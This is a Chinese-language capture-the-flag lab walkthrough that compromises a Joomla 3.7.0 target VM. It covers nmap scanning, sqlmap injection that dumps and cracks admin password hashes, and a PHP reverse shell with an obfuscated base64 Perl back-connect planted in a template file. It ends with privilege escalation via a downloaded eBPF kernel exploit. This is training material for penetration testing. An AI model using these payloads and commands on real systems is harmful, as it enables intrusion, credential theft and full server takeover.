# 端口发现
nmap -sP 192.168.31.0/24
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668648890213-c3a7f192-c86a-40cd-9b48-1de75e9fe374.png#averageHue=%2327303d&clientId=u22557562-ca85-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=346&id=u2333f5fd&margin=%5Bobject%20Object%5D&name=image.png&originHeight=346&originWidth=1190&originalType=binary&ratio=1&rotation=0&showTitle=false&size=97263&status=done&style=none&taskId=ucaa596a9-fa49-4e36-a958-d344151697d&title=&width=1190)
nmap -A -p- 192.168.31.148
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668648959498-511caada-6371-4bb3-be18-90baac90dddd.png#averageHue=%2329313d&clientId=u22557562-ca85-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=317&id=ud95153db&margin=%5Bobject%20Object%5D&name=image.png&originHeight=317&originWidth=1039&originalType=binary&ratio=1&rotation=0&showTitle=false&size=87373&status=done&style=none&taskId=u916533f5-8118-4748-875e-62137e5e7da&title=&width=1039)
nmap --script=vuln 192.168.31.148
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668666644037-de851200-99a9-479c-a55e-ec8d59b132bb.png#averageHue=%232a3341&clientId=u22557562-ca85-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=210&id=u2a3d44dd&margin=%5Bobject%20Object%5D&name=image.png&originHeight=210&originWidth=907&originalType=binary&ratio=1&rotation=0&showTitle=false&size=59447&status=done&style=none&taskId=u39dbf3e6-e041-40ee-85cf-287b37d02c8&title=&width=907)
# web 突破
扫描结果，只开放了 80 端口
访问 80 端口
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668649128514-25657380-0972-49c1-a7e9-cb0ec514166a.png#averageHue=%23cfdcc1&clientId=u22557562-ca85-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=697&id=u2bcb5e66&margin=%5Bobject%20Object%5D&name=image.png&originHeight=697&originWidth=1920&originalType=binary&ratio=1&rotation=0&showTitle=false&size=105364&status=done&style=none&taskId=ub5f8f2a0-75a1-4f73-9fbb-249a25dab95&title=&width=1920)
dirb 扫后台
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668649178412-746fbe4c-8f8f-44d4-909a-a9feb55f8e98.png#averageHue=%23293441&clientId=u22557562-ca85-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=335&id=u3c0209ea&margin=%5Bobject%20Object%5D&name=image.png&originHeight=335&originWidth=1034&originalType=binary&ratio=1&rotation=0&showTitle=false&size=118192&status=done&style=none&taskId=u0eb241c3-b478-40d9-9f88-4015810ddd6&title=&width=1034)
有个 administrator 后台，访问管理后台
这是逐浪的 cms，所以尝试使用逐浪的默认用户名和密码 admin : snoopy
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668669198721-e8095326-c255-4640-ba01-1550fe53bd44.png#averageHue=%23fafaf9&clientId=u22557562-ca85-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=901&id=u31a9ea4a&margin=%5Bobject%20Object%5D&name=image.png&originHeight=901&originWidth=1920&originalType=binary&ratio=1&rotation=0&showTitle=false&size=68303&status=done&style=none&taskId=u822ec9f8-45cf-48e5-a40e-3112cc3149e&title=&width=1920)
成功进入网站后台
第二种方法：搜索攻击方式
前面已经扫出来了后台数据库 joomla 3.7.0，直接对数据库进行攻击，获取管理员账户和密码
searchsploit joomla 3.7.0
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668666578364-1843f658-2326-49d3-91e4-cebf6e605dd8.png#averageHue=%2328313e&clientId=u22557562-ca85-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=326&id=ueb0a4c59&margin=%5Bobject%20Object%5D&name=image.png&originHeight=326&originWidth=1248&originalType=binary&ratio=1&rotation=0&showTitle=false&size=82498&status=done&style=none&taskId=uc3278170-0dbc-4f8f-be55-f133269fa5f&title=&width=1248)
将 42033 复制到当前目录后，查看
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668666835541-d7b732e6-fc0f-46e6-af73-dda980ae684a.png#averageHue=%2328313e&clientId=u22557562-ca85-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=497&id=ude1e929a&margin=%5Bobject%20Object%5D&name=image.png&originHeight=497&originWidth=1274&originalType=binary&ratio=1&rotation=0&showTitle=false&size=120494&status=done&style=none&taskId=uaa79f2ad-f08d-4d15-860c-a3d3062d548&title=&width=1274)
文档中说使用 sqlmap，并给出了命令
修改命令中的参数后执行
sqlmap -u "http://192.168.31.148/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --batch --level=5 --random-agent --dbs -p list[fullordering]
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668667175849-519e6972-a3ef-4183-9421-c7129387c245.png#averageHue=%2327303d&clientId=u22557562-ca85-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=255&id=uee015f63&margin=%5Bobject%20Object%5D&name=image.png&originHeight=255&originWidth=1059&originalType=binary&ratio=1&rotation=0&showTitle=false&size=53288&status=done&style=none&taskId=ue2a8550a-7dc1-4509-b67b-73fb83da281&title=&width=1059)
扫出 4 数据库
接下来扫 joomladb 库中的表
sqlmap -u "http://192.168.31.148/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D joomladb --tables -p list[fullordering]
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668667441165-409fea70-9a94-42f4-90e0-00a5f094b785.png#averageHue=%23262f3b&clientId=u22557562-ca85-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=501&id=uaca0375e&margin=%5Bobject%20Object%5D&name=image.png&originHeight=501&originWidth=1241&originalType=binary&ratio=1&rotation=0&showTitle=false&size=93006&status=done&style=none&taskId=u164f99d9-b149-435c-94f4-38f7063fff1&title=&width=1241)
joomladb 中的表太多了
查询 #__users 表中的列名
sqlmap -u "http://192.168.31.148/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668668904677-07bdedf7-8ca4-4e81-89de-970f8199df51.png#averageHue=%232f323c&clientId=u22557562-ca85-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=788&id=ub84bf420&margin=%5Bobject%20Object%5D&name=image.png&originHeight=788&originWidth=1699&originalType=binary&ratio=1&rotation=0&showTitle=false&size=317011&status=done&style=none&taskId=ub5f9fdc3-b258-477d-8dac-e5ee5807c2d&title=&width=1699)
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668668932835-11bb8ad9-49c0-4a91-bddf-a8bdc35fbfbb.png#averageHue=%232e303a&clientId=u22557562-ca85-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=254&id=u3bd53c25&margin=%5Bobject%20Object%5D&name=image.png&originHeight=254&originWidth=962&originalType=binary&ratio=1&rotation=0&showTitle=false&size=37657&status=done&style=none&taskId=uca08cf93-af2a-4538-9caa-c061cef08f3&title=&width=962)
dump 出 name 和 password 的值
sqlmap -u "http://192.168.31.148/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D "joomladb" -T "#__users" -C"name,password" --dump -p list[fullordering]
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668669093731-6c1deb99-5a26-4a27-89ec-099405ab5adc.png#averageHue=%232f323c&clientId=u22557562-ca85-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=289&id=u31378b56&margin=%5Bobject%20Object%5D&name=image.png&originHeight=289&originWidth=1530&originalType=binary&ratio=1&rotation=0&showTitle=false&size=91919&status=done&style=none&taskId=u380b2efc-85aa-487f-ac52-d828866d937&title=&width=1530)
得到管理员用户名 admin和密码（哈希加密后）
将密码复制放入一个 txt 文本中，使用 john 命令解码
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668669369450-f3d3d196-19f8-4367-8997-081466263169.png#averageHue=%232e313c&clientId=u22557562-ca85-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=215&id=ud82f29dc&margin=%5Bobject%20Object%5D&name=image.png&originHeight=215&originWidth=985&originalType=binary&ratio=1&rotation=0&showTitle=false&size=54902&status=done&style=none&taskId=u58851ba0-86aa-4f23-a553-2f587571618&title=&width=985)
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668669398885-4d352b27-a17c-4776-8d29-090e343d223d.png#averageHue=%2330343f&clientId=u22557562-ca85-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=271&id=u5ab5fad9&margin=%5Bobject%20Object%5D&name=image.png&originHeight=271&originWidth=989&originalType=binary&ratio=1&rotation=0&showTitle=false&size=70950&status=done&style=none&taskId=u4e0f3951-0244-41de-8a16-62aadd609bc&title=&width=989)
得到密码 snoopy
登入后台后，还是经典的插件
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668669475156-2047fd80-ff7e-4e44-a4de-fc5e1abf9a13.png#averageHue=%23f9f8f6&clientId=u22557562-ca85-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=964&id=u9333bc99&margin=%5Bobject%20Object%5D&name=image.png&originHeight=964&originWidth=1920&originalType=binary&ratio=1&rotation=0&showTitle=false&size=142104&status=done&style=none&taskId=udff10a6d-9dc1-4622-8f7e-84b009fe822&title=&width=1920)
同样是将 index.php 的内容修改为反弹 shell
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668669629508-9f96fe71-acb9-4a8c-9342-cbaabe152b51.png#averageHue=%23fafaf9&clientId=u22557562-ca85-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=905&id=u671dc45e&margin=%5Bobject%20Object%5D&name=image.png&originHeight=905&originWidth=1920&originalType=binary&ratio=1&rotation=0&showTitle=false&size=99743&status=done&style=none&taskId=u1fe3c259-3d8b-4f63-8faa-a5d6b8794f0&title=&width=1920)
反弹 shell 如下：
```php
<?php
  function which($pr) {
  $path = execute("which $pr");
return ($path ? $path : $pr);
}
function execute($cfe) {
  $res = '';
  if ($cfe) {
    if(function_exists('exec')) {
      @exec($cfe,$res);
      $res = join("\n",$res);
    } elseif(function_exists('shell_exec')) {
      $res = @shell_exec($cfe);
    } elseif(function_exists('system')) {
      @ob_start();
      @system($cfe);
      $res = @ob_get_contents();
      @ob_end_clean();
    } elseif(function_exists('passthru')) {
      @ob_start();
      @passthru($cfe);
      $res = @ob_get_contents();
      @ob_end_clean();
    } elseif(@is_resource($f = @popen($cfe,"r"))) {
      $res = '';
      while(!@feof($f)) {
        $res .= @fread($f,1024);
      }
      @pclose($f);
    }
  }
  return $res;
}
function cf($fname,$text){
  if($fp=@fopen($fname,'w')) {
    @fputs($fp,@base64_decode($text));
    @fclose($fp);
  }
}
$yourip = "192.168.31.128"; 
$yourport = '4444';
$usedb = array('perl'=>'perl','c'=>'c');
$back_connect="IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJHN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiO2Vj"."aG8gImBpZGAiOy9iaW4vc2gnOw0KJDA9JGNtZDsNCiR0YXJnZXQ9JEFSR1ZbMF07DQokcG9ydD0kQVJHVlsxXTsNCiRpYWRkcj1pbmV0X2F0b24oJHR"."hcmdldCkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRwb3J0LCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKT"."sNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoI"."kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQi"."KTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgkc3lzdGVtKTsNCmNsb3NlKFNUREl"."OKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw==";
cf('/tmp/.bc',$back_connect);
$res = execute(which('perl')." /tmp/.bc $yourip $yourport &");
?>

```
kali 开启监听端口
修改完后保存并预览（让 index.php 被解析）
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668669745837-6aaddc43-66d7-4058-8ce6-aa762cfade9c.png#averageHue=%23949391&clientId=u22557562-ca85-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=982&id=ud275ef15&margin=%5Bobject%20Object%5D&name=image.png&originHeight=982&originWidth=1920&originalType=binary&ratio=1&rotation=0&showTitle=false&size=158548&status=done&style=none&taskId=u25f978e4-d64f-4006-a706-04c7238459c&title=&width=1920)
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668669757495-de2dbb88-e733-42da-b2c9-1172d95548d9.png#averageHue=%2330343f&clientId=u22557562-ca85-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=185&id=ue441491e&margin=%5Bobject%20Object%5D&name=image.png&originHeight=185&originWidth=936&originalType=binary&ratio=1&rotation=0&showTitle=false&size=36456&status=done&style=none&taskId=u1b4424d7-f377-4e7a-88de-022f23c93a7&title=&width=936)
python 优化 shell
python -c 'import pty;pty.spawn("/bin/bash")'
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668669822950-bd7aeac6-40ae-4b1e-9980-eb09fd1d8500.png#averageHue=%23323743&clientId=u22557562-ca85-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=53&id=ua5454b60&margin=%5Bobject%20Object%5D&name=image.png&originHeight=53&originWidth=433&originalType=binary&ratio=1&rotation=0&showTitle=false&size=8246&status=done&style=none&taskId=u941f320b-11dd-4c2d-9558-a03f6feec6d&title=&width=433)
# 提权
查看当前靶机的操作系统版本：
lsb_release -a
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668669963954-5203b72c-037a-4ba7-b0f5-15247524a167.png#averageHue=%2331353f&clientId=u0bd52dc4-4f77-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=156&id=ucb2ca7ac&margin=%5Bobject%20Object%5D&name=image.png&originHeight=156&originWidth=582&originalType=binary&ratio=1&rotation=0&showTitle=false&size=25540&status=done&style=none&taskId=u1b296f7c-f2b0-4713-a647-6778b3848fa&title=&width=582)
在 kali 里寻找 ubuntu 16.04 版本的漏洞
searchsploit ubuntu 16.04
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668670109906-98431351-286b-4f95-83c8-f7b37a411c39.png#averageHue=%23343945&clientId=u0bd52dc4-4f77-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=433&id=u12b9f427&margin=%5Bobject%20Object%5D&name=image.png&originHeight=433&originWidth=1260&originalType=binary&ratio=1&rotation=0&showTitle=false&size=238441&status=done&style=none&taskId=ue798e94c-6eef-4368-aec3-067166cc163&title=&width=1260)
复制并查看 39772.txt
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668671161600-fb493e9d-57ef-4af3-a60e-5c54845ff7a4.png#averageHue=%2330343e&clientId=u0bd52dc4-4f77-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=101&id=u9cea493f&margin=%5Bobject%20Object%5D&name=image.png&originHeight=101&originWidth=734&originalType=binary&ratio=1&rotation=0&showTitle=false&size=21601&status=done&style=none&taskId=u2bcc9ef2-f95b-462e-8c9d-9505b4e0532&title=&width=734)
39772.txt 里说在靶机里用 wget 下载 39772.zip，如果靶机不能访问 github 的话
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668671300441-2dc3dc8c-0e8a-4256-875f-8ff2137a3daf.png#averageHue=%23313540&clientId=u0bd52dc4-4f77-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=76&id=u69f2d81b&margin=%5Bobject%20Object%5D&name=image.png&originHeight=76&originWidth=1096&originalType=binary&ratio=1&rotation=0&showTitle=false&size=15672&status=done&style=none&taskId=u08a426dc-20e7-45ea-b868-8fa969894cb&title=&width=1096)
去搜索 exploitdb 39772
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668671217323-c19647c0-73bb-4f0a-a1e3-602fdefa4dd4.png#averageHue=%23f0e2d5&clientId=u0bd52dc4-4f77-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=968&id=uc4dfc501&margin=%5Bobject%20Object%5D&name=image.png&originHeight=968&originWidth=1920&originalType=binary&ratio=1&rotation=0&showTitle=false&size=191045&status=done&style=none&taskId=u8a6d0bc4-b333-4269-ba3e-510eb3231ae&title=&width=1920)
靶机 wget 这个网址
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668671516296-105af237-74ea-41ca-a96f-51abb0e7f51a.png#averageHue=%23efe0d7&clientId=u0bd52dc4-4f77-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=773&id=u1462054b&margin=%5Bobject%20Object%5D&name=image.png&originHeight=773&originWidth=1699&originalType=binary&ratio=1&rotation=0&showTitle=false&size=184472&status=done&style=none&taskId=u04839e69-7924-465f-978f-bed1a91af74&title=&width=1699)
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668671769341-6cc571d6-40f2-4639-bdb9-36c815288649.png#averageHue=%232e333d&clientId=u0bd52dc4-4f77-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=390&id=u9aef056c&margin=%5Bobject%20Object%5D&name=image.png&originHeight=390&originWidth=1260&originalType=binary&ratio=1&rotation=0&showTitle=false&size=138201&status=done&style=none&taskId=u7933c2ff-bcf9-404b-9f2d-ffb65c2e605&title=&width=1260)
有的目录不让写入，下载成功无法保存，所以去网站目录下
靶机中操作：
unzip 39772.zip
cd 39772
tar -xvf exploit.tar
cd ebpf_mapfd_doubleput_exploit
./compile.sh
./doubleput   (时间较长)
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668672192734-1747f6ed-c171-432e-b859-f19e375fc09f.png#averageHue=%232f343f&clientId=u0bd52dc4-4f77-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=130&id=ua72fd619&margin=%5Bobject%20Object%5D&name=image.png&originHeight=130&originWidth=744&originalType=binary&ratio=1&rotation=0&showTitle=false&size=25586&status=done&style=none&taskId=ue83c1c2b-7740-4a42-9e42-8643f5d516c&title=&width=744)
找 flag
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668672238603-adc9e39f-6ba5-4ed9-beb9-74bdb4b5224a.png#averageHue=%232d303a&clientId=u0bd52dc4-4f77-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=464&id=u614dcf63&margin=%5Bobject%20Object%5D&name=image.png&originHeight=464&originWidth=1016&originalType=binary&ratio=1&rotation=0&showTitle=false&size=91728&status=done&style=none&taskId=u939bece1-fa13-4365-af4f-466fd0fba44&title=&width=1016)


